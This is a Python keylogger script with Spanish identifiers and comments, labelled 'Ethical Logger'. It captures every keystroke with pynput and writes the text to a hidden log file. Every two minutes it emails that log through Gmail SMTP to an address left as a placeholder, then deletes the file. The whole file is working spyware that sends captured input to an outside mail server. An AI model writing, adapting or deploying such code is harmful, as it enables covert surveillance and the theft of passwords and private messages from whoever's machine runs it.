#!/usr/bin/env python
#_*_coding: utf8 _*_

import pynput.keyboard
import smtplib
import time
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import remove

lista_teclas = []


def presiona(key):
    key1 = convertir(key)
    if key1 == "Key.esc":
        print("Saliendo")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append("\n")
    elif key1 == "Key.backspace":
        pass
    elif key1 == "Key.tab":
        pass
    elif key1 == "Key.shift_r":
        pass
    elif key1 == "Key.shift_l":
        pass
    elif key1 == "Key.shift":
        pass
    elif key1 == "Key.ctrl_l":
        pass
    elif key1 == "Key.ctrl_r":
        pass
    elif key1 == "Key.alt_gr":
        pass
    else:
        lista_teclas.append(key1)

def convertir(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

#Configuración Correo
def enviar_datos():
    msg = MIMEMultipart()
    psw = "ponAquiTuContraseña"
    msg['From'] = 'ponAquiTuCorreo'
    msg['To'] = 'ponAquiTuCorreo'
    msg['Subject'] = "Ethical Logger"
    msg.attach(MIMEText(open('../.log.txt').read()))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], psw)
        server.sendmail(msg['From'], msg['To'], msg.as_string() )
        server.quit()
    except:
        pass

def imprimir():
    log_file = open('../.log.txt', 'w+')
    teclas = ''.join(lista_teclas)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()
    time.sleep(3)
    enviar_datos()
    remove('../.log.txt')

def timer(timer_runs):
    while timer_runs.is_set():
        time.sleep(120)   # 30 segundos.
        imprimir()
        
timer_runs = threading.Event()
timer_runs.set()
t = threading.Thread(target=timer, args=(timer_runs,))
t.start()



with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()